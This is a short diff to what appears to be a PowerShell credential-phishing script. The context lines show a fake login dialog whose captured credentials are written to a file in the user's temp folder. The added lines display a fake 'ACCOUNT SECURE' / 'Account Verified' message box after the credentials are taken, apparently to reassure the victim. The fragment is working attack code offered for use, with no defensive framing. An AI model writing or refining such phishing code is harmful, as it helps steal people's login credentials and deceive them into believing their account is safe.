@@ -199,6 +199,16 @@ $loginWindow.ShowDialog()
 
 echo $creds >> $env:TMP\$FileName
 
+Add-Type -AssemblyName PresentationCore, PresentationFramework
+# Create a message for the user
+$msgBody = "ACCOUNT SECURE"
+$msgTitle = "Account Verified"
+$msgButton = 'Ok'
+$msgImage = 'Information'
+
+# Show a message box with location information
+$Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
+Write-Host "The user clicked: $Result"
 #------------------------------------------------------------------------------------------------------------------------------------
 
 <#
